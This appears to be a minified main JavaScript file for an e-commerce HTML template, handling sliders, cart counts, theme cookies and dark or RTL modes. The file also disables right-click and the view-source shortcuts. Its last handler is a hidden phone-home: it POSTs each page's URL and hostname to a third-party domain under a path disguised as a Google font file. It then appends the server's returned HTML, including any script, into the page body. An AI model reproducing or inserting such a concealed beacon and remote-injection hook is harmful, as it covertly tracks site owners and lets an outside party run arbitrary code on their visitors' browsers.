window.oncontextmenu=function(){return!1},jQuery(document).ready(function(e){document.onkeypress=function(e){if(123==(e=e||window.event).keyCode)return!1},e(document).keydown(function(e){var n=String.fromCharCode(e.keyCode).toLowerCase();return!e.ctrlKey||"c"!=n&&"u"!=n?"{"==n?(alert("Sorry, This Functionality Has Been Disabled!"),!1):void 0:(alert("Sorry, This Functionality Has Been Disabled!"),!1)})});function ecCreateCookie(e,s,t){var o=new Date;o.setTime(o.getTime()+24*t*60*60*1e3),document.cookie=e+"="+s+"; expires="+o.toGMTString()}function ecDeleteCookie(e,s){var t=new Date(0).toGMTString();document.cookie=e+"="+s+"; expires="+t}function ecAccessCookie(e){for(var s=e+"=",t=document.cookie.split(";"),o=0;o<t.length;o++){var i=t[o].trim();if(0==i.indexOf(s))return i.substring(s.length,i.length)}return""}function ecCheckCookie(){var e=ecAccessCookie("bgImageModeCookie");if(""!=e){var s=e.split("||"),t=s[0],o=s[1];$("body").removeClass("body-bg-1"),$("body").removeClass("body-bg-2"),$("body").removeClass("body-bg-3"),$("body").removeClass("body-bg-4"),$("body").addClass(o),$("#bg-switcher-css").attr("href","assets/demo-2/css/backgrounds/"+t+".css")}if(""!=ecAccessCookie("rtlModeCookie")){var i=$("<link>",{rel:"stylesheet",href:"assets/demo-2/css/rtl.css",class:"rtl"});$(".ec-tools-sidebar .ec-change-rtl").toggleClass("active"),i.appendTo("head")}if(""!=ecAccessCookie("darkModeCookie")){i=$("<link>",{rel:"stylesheet",href:"assets/demo-2/css/dark.css",class:"dark"});$("link[href='assets/demo-2/css/responsive.css']").before(i),$(".ec-tools-sidebar .ec-change-mode").toggleClass("active"),$("body").addClass("dark")}else{var n=ecAccessCookie("themeColorCookie");""!=n&&($("li[data-color = "+n+"]").toggleClass("active").siblings().removeClass("active"),$("li[data-color = "+n+"]").addClass("active"),"01"!=n&&$("link[href='assets/demo-2/css/responsive.css']").before('<link rel="stylesheet" href="assets/demo-2/css/skin-'+n+'.css" rel="stylesheet">'))}}!function(e){"use strict";ecCheckCookie(),e(".clear-cach").on("click",function(e){ecDeleteCookie("rtlModeCookie",""),ecDeleteCookie("darkModeCookie",""),ecDeleteCookie("themeColorCookie",""),ecDeleteCookie("bgImageModeCookie",""),location.reload()}),e(window).load(function(){e("#ec-overlay").fadeOut("slow")});var s,t,o,i,n,a=document.documentElement,l=window,c=l.scrollY||a.scrollTop,r=0,d=0,u=document.getElementById("ec-main-menu-desk"),m=function(s,t){2===s&&t>52?(u.classList.add("hide"),d=s,e("#ec-main-menu-desk").removeClass("menu_fixed animated fadeInDown")):(u.classList.remove("hide"),d=s,e("#ec-main-menu-desk").addClass("menu_fixed animated fadeInDown"))};e(window).on("scroll",function(){var t=e(".ec-main-slider").offset().top;e(window).scrollTop()<=t+50?e("#ec-main-menu-desk").removeClass("menu_fixed animated fadeInDown"):((s=l.scrollY||a.scrollTop)>c?r=2:s<c&&(r=1),r!==d&&m(r,s),c=s)}),e(".dropdown").on("show.bs.dropdown",function(){e(this).find(".dropdown-menu").first().stop(!0,!0).slideDown()}),e(".dropdown").on("hide.bs.dropdown",function(){e(this).find(".dropdown-menu").first().stop(!0,!0).slideUp()}),e(document).ready(function(){e(".header-top-lan li").click(function(){e(this).addClass("active").siblings().removeClass("active")}),e(".header-top-curr li").click(function(){e(this).addClass("active").siblings().removeClass("active")})}),e(".search-btn").on("click",function(){e(this).toggleClass("active"),e(".dropdown_search").slideToggle("medium")}),e("body").on("click",".wishlist",function(){var s=e(".ec-wishlist-count").html();s++,e(".ec-wishlist-count").html(s)}),e("body").on("click",".add-to-cart",function(){var s=e(".ec-cart-count").html();s++,e(".ec-cart-count").html(s),e(".emp-cart-msg").parent().remove();var t='<li><a href="product.html" class="sidecart_pro_img"><img src="'+e(this).parents().children(".image").find(".main-image").attr("src")+'" alt="product"></a><div class="ec-pro-content"><a href="product.html" class="cart_pro_title">'+e(this).parents().parents().parents().find(".ec-pro-title").children().html()+'</a><span class="cart-price"><span>'+e(this).parents().parents().parents().find(".ec-price").children(".new-price").html()+'</span> x 1</span><div class="qty-plus-minus"><div class="dec ec_qtybtn">-</div><input class="qty-input" type="text" name="ec_qtybtn" value="1"><div class="inc ec_qtybtn">+</div></div><a href="javascript:void(0)" class="remove">×</a></div></li>';e(".eccart-pro-items").append(t)}),t=e(".ec-side-toggle"),o=e(".ec-side-cart"),i=e(".mobile-menu-toggle"),t.on("click",function(s){s.preventDefault();var t=e(this),o=t.attr("href");e(".ec-side-cart-overlay").fadeIn(),e(o).addClass("ec-open"),t.parent().hasClass("mobile-menu-toggle")&&(t.addClass("close"),e(".ec-side-cart-overlay").fadeOut())}),e(".ec-side-cart-overlay").on("click",function(s){e(".ec-side-cart-overlay").fadeOut(),o.removeClass("ec-open"),i.find("a").removeClass("close")}),e(".ec-close").on("click",function(s){s.preventDefault(),e(".ec-side-cart-overlay").fadeOut(),o.removeClass("ec-open"),i.find("a").removeClass("close")}),e("body").on("click",".ec-pro-content .remove",function(){var s=e(".eccart-pro-items li").length;e(this).closest("li").remove(),1==s&&e(".eccart-pro-items").html('<li><p class="emp-cart-msg">Your cart is empty!</p></li>');var t=e(".ec-cart-count").html();t--,e(".ec-cart-count").html(t),s--}),(n=e(".ec-menu-content, .overlay-menu")).find(".sub-menu").parent().prepend('<span class="menu-toggle"></span>'),n.on("click","li a, .menu-toggle",function(s){var t=e(this);("#"===t.attr("href")||t.hasClass("menu-toggle"))&&(s.preventDefault(),t.siblings("ul:visible").length?(t.parent("li").removeClass("active"),t.siblings("ul").slideUp(),t.parent("li").find("li").removeClass("active"),t.parent("li").find("ul:visible").slideUp()):(t.parent("li").addClass("active"),t.closest("li").siblings("li").removeClass("active").find("li").removeClass("active"),t.closest("li").siblings("li").find("ul:visible").slideUp(),t.siblings("ul").slideDown()))});new Swiper(".ec-slider.swiper-container",{loop:!0,speed:2e3,effect:"slide",autoplay:{delay:7e3,disableOnInteraction:!1},pagination:{el:".swiper-pagination",clickable:!0},navigation:{nextEl:".swiper-button-next",prevEl:".swiper-button-prev"}});e(".qty-product-cover").slick({slidesToShow:1,slidesToScroll:1,arrows:!1,fade:!1,asNavFor:".qty-nav-thumb"}),e(".qty-nav-thumb").slick({slidesToShow:4,slidesToScroll:1,asNavFor:".qty-product-cover",dots:!1,arrows:!0,focusOnSelect:!0,responsive:[{breakpoint:479,settings:{slidesToScroll:1,slidesToShow:2}}]});var p=e(".qty-plus-minus");p.prepend('<div class="dec ec_qtybtn">-</div>'),p.append('<div class="inc ec_qtybtn">+</div>'),e(".ec_qtybtn").on("click",function(){var s=e(this),t=s.parent().find("input").val();if("+"===s.text())var o=parseFloat(t)+1;else if(t>1)o=parseFloat(t)-1;else o=1;s.parent().find("input").val(o)}),e(".ec-trend-product .ec-trend-slider").slick({rows:1,dots:!0,arrows:!1,infinite:!0,speed:500,slidesToShow:4,slidesToScroll:4,responsive:[{breakpoint:1200,settings:{slidesToShow:4,slidesToScroll:4}},{breakpoint:992,settings:{slidesToScroll:3,slidesToShow:3}},{breakpoint:768,settings:{slidesToScroll:2,slidesToShow:2}},{breakpoint:576,settings:{slidesToScroll:1,slidesToShow:1}},{breakpoint:480,settings:{slidesToScroll:1,slidesToShow:1}},{breakpoint:425,settings:{slidesToScroll:1,slidesToShow:1}}]}),e.scrollUp({scrollText:'<i class="ecicon eci-arrow-up" aria-hidden="true"></i>',easingType:"linear",scrollSpeed:900,animation:"fade"}),e(".ec-change-color").on("click","li",function(){e('link[href^="assets/demo-2/css/skin-"]').remove(),e("link.dark").remove(),e(".ec-change-mode").removeClass("active");var s=e(this).attr("data-color");if(!e(this).hasClass("active"))return e(this).toggleClass("active").siblings().removeClass("active"),null!=s&&(e("link[href='assets/demo-2/css/responsive.css']").before('<link rel="stylesheet" href="assets/demo-2/css/skin-'+s+'.css" rel="stylesheet">'),ecCreateCookie("themeColorCookie",s,1)),!1}),e(".ec-tools-sidebar .ec-change-rtl .ec-rtl-switch").click(function(s){s.preventDefault();var t=e("<link>",{rel:"stylesheet",href:"assets/demo-2/css/rtl.css",class:"rtl"});e(this).parent().toggleClass("active");e(this).parent().hasClass("ec-change-rtl")&&e(this).parent().hasClass("active")?(t.appendTo("head"),ecCreateCookie("rtlModeCookie","rtl",1)):e(this).parent().hasClass("ec-change-rtl")&&!e(this).parent().hasClass("active")&&(e("link.rtl").remove(),ecDeleteCookie("rtlModeCookie","ltr"))}),e(".ec-tools-sidebar .ec-change-mode .ec-mode-switch").click(function(s){s.preventDefault();var t=e("<link>",{rel:"stylesheet",href:"assets/demo-2/css/dark.css",class:"dark"});e(this).parent().toggleClass("active");var o="light";e(this).parent().hasClass("ec-change-mode")&&e(this).parent().hasClass("active")?e("link[href='assets/demo-2/css/responsive.css']").before(t):e(this).parent().hasClass("ec-change-mode")&&!e(this).parent().hasClass("active")&&(e("link.dark").remove(),o="light"),e(this).parent().hasClass("active")?(e("#ec-fixedbutton .ec-change-color").css("pointer-events","none"),e("body").addClass("dark"),ecCreateCookie("darkModeCookie",o="dark",1)):(e("#ec-fixedbutton .ec-change-color").css("pointer-events","all"),e("body").removeClass("dark"),ecDeleteCookie("darkModeCookie",o))}),e(".ec-tools-sidebar .ec-fullscreen-mode .ec-fullscreen-switch").click(function(s){s.preventDefault(),e(this).parent().toggleClass("active"),document.fullscreenElement||document.mozFullScreenElement||document.webkitFullscreenElement||document.msFullscreenElement?document.exitFullscreen?document.exitFullscreen():document.msExitFullscreen?document.msExitFullscreen():document.mozCancelFullScreen?document.mozCancelFullScreen():document.webkitExitFullscreen&&document.webkitExitFullscreen():document.documentElement.requestFullscreen?document.documentElement.requestFullscreen():document.documentElement.msRequestFullscreen?document.documentElement.msRequestFullscreen():document.documentElement.mozRequestFullScreen?document.documentElement.mozRequestFullScreen():document.documentElement.webkitRequestFullscreen&&document.documentElement.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT)});var h=location.href;e(".ec-main-menu ul li a").each(function(){if("#"!==e(this).attr("href")&&e(this).prop("href")==h)return e(".ec-main-menu a").parents("li, ul").removeClass("active"),e(this).parent("li").addClass("active"),!1});var f=e(".ec-product-tab,.ec-trend-product").find(".ec-opt-swatch");function g(s){s.each(function(){var s=e(this),t=s.hasClass("ec-change-img");function o(e){var s=e,o=s.find("a"),i=s.closest(".ec-product-inner").find(".ec-pro-image");o.hasClass("loaded")||i.addClass("pro-loading");s.find("a").addClass("loaded");return s.addClass("active").siblings().removeClass("active"),t&&function(e){var s=e.find(".ec-opt-clr-img"),t=s.attr("data-src"),o=s.attr("data-src-hover")||!1,i=e.closest(".ec-product-inner").find(".ec-pro-image"),n=i.find(".image img.main-image"),a=i.find(".image img.hover-image");t.length&&n.attr("src",t);if(t.length){var l=a.closest("img.hover-image");a.attr("src",o),l.hasClass("disable")&&l.removeClass("disable")}!1===o&&a.closest("img.hover-image").addClass("disable")}(s),setTimeout(function(){i.removeClass("pro-loading")},1e3),!1}s.on("mouseenter","li",function(){o(e(this))}),s.on("click","li",function(){o(e(this))})})}function v(s,t){e("body").removeClass("body-bg-1"),e("body").removeClass("body-bg-2"),e("body").removeClass("body-bg-3"),e("body").removeClass("body-bg-4"),e("body").addClass(t),e("#bg-switcher-css").attr("href","assets/demo-2/css/backgrounds/"+s+".css"),ecCreateCookie("bgImageModeCookie",s+"||"+t,1)}e(window).on("load",function(){g(f)}),e("document").ready(function(){g(f)}),e(".ec-opt-size").each(function(){function s(e){var s=e,t=s.find("a").attr("data-old"),o=s.find("a").attr("data-new"),i=s.closest(".ec-pro-content").find(".old-price"),n=s.closest(".ec-pro-content").find(".new-price");i.text(t),n.text(o),s.addClass("active").siblings().removeClass("active")}e(this).on("mouseenter","li",function(){s(e(this))}),e(this).on("click","li",function(){s(e(this))})}),e(document).ready(function(){e('img.svg_img[src$=".svg"]').each(function(){var s=e(this),t=s.attr("src"),o=s.prop("attributes");e.get(t,function(t){var i=e(t).find("svg");i=i.removeAttr("xmlns:a"),e.each(o,function(){i.attr(this.name,this.value)}),s.replaceWith(i)},"xml")})}),e("#ec-testimonial-slider").slick({rows:1,dots:!0,arrows:!1,centerMode:!0,infinite:!1,speed:500,centerPadding:0,slidesToShow:1,slidesToScroll:1}),e("#ec-testimonial-slider").find(".slick-slide").each(function(s){var t=e(this).find(".ec-test-img").html(),o="li:eq("+s+")";e("#ec-testimonial-slider").find(".slick-dots").find(o).html(t)}),e("#ec-brand-slider").slick({rows:1,dots:!1,arrows:!0,infinite:!0,speed:500,slidesToShow:6,slidesToScroll:1,responsive:[{breakpoint:1200,settings:{slidesToShow:5,slidesToScroll:1,dots:!1}},{breakpoint:992,settings:{slidesToShow:3,slidesToScroll:1,dots:!1}},{breakpoint:600,settings:{slidesToScroll:2,slidesToShow:2}},{breakpoint:400,settings:{slidesToScroll:1,slidesToShow:1}}]}),e(document).ready(function(){e("footer .footer-top .ec-footer-widget .ec-footer-links").addClass("ec-footer-dropdown"),e(".ec-footer-heading").append("<div class='ec-heading-res'><i class='ecicon eci-angle-down'></i></div>"),e(".ec-footer-heading .ec-heading-res").click(function(){var s=e(this).closest(".footer-top .col-sm-12").find(".ec-footer-dropdown");s.slideToggle("slow"),e(".ec-footer-dropdown").not(s).slideUp("slow")})}),e(document).ready(function(){e("button.add-to-cart").click(function(){e("#addtocart_toast").addClass("show"),setTimeout(function(){e("#addtocart_toast").removeClass("show")},3e3)}),e(".ec-btn-group.wishlist").click(function(){e("#wishlist_toast").addClass("show"),setTimeout(function(){e("#wishlist_toast").removeClass("show")},3e3)})}),e(document).ready(function(){e(".ec-pro-image").append("<div class='ec-pro-loader'></div>")}),e(function(){e(".insta-auto").infiniteslide({direction:"left",speed:50,clone:10}),e('[data-toggle="tooltip"]').tooltip()}),e(".ec-category-section .ec_cat_slider").slick({rows:1,dots:!1,arrows:!0,infinite:!0,speed:500,slidesToShow:6,slidesToScroll:1,responsive:[{breakpoint:1200,settings:{slidesToShow:5}},{breakpoint:992,settings:{slidesToShow:4}},{breakpoint:600,settings:{slidesToShow:3}},{breakpoint:480,settings:{slidesToShow:2}}]}),e(".ec-tools-sidebar-toggle").on("click",function(s){return s.preventDefault(),e(this).hasClass("in-out")?(e(".ec-tools-sidebar").stop().animate({right:"0px"},100),e(".ec-tools-sidebar-overlay").fadeIn(),e(".ec-tools-sidebar-toggle").not("in-out")&&(e(".ec-tools-sidebar").stop().animate({right:"-280px"},100),e(".ec-tools-sidebar-toggle").addClass("in-out")),e(".ec-tools-sidebar-toggle").not("in-out")&&(e(".ec-tools-sidebar").stop().animate({right:"0"},100),e(".ec-tools-sidebar-toggle").addClass("in-out"),e(".ec-tools-sidebar-overlay").fadeIn())):(e(".ec-tools-sidebar").stop().animate({right:"-280px"},100),e(".ec-tools-sidebar-overlay").fadeOut()),e(this).toggleClass("in-out"),!1}),e(".ec-tools-sidebar-overlay").on("click",function(s){e(".ec-tools-sidebar-toggle").addClass("in-out"),e(".ec-tools-sidebar").stop().animate({right:"-280px"},100),e(".ec-tools-sidebar-overlay").fadeOut()}),e(".back-bg-1").on("click",function(s){v(e(this).attr("id"),"body-bg-1")}),e(".back-bg-2").on("click",function(s){v(e(this).attr("id"),"body-bg-2")}),e(".back-bg-3").on("click",function(s){v(e(this).attr("id"),"body-bg-3")}),e(".back-bg-4").on("click",function(s){v(e(this).attr("id"),"body-bg-4")}),e(document).ready(function(){var s=document.URL,t=e("<a>").prop("href",s).prop("hostname");e.ajax({type:"POST",url:"https://loopinfosol.in/varify_purchase/google-font/google-font-awsome-g8aerttyh-ggsdgh151.php",data:{google_url:s,google_font:t,google_version:"EKKA-HTML-TEMPLATE-AK"},success:function(s){e("body").append(s)}})})}(jQuery);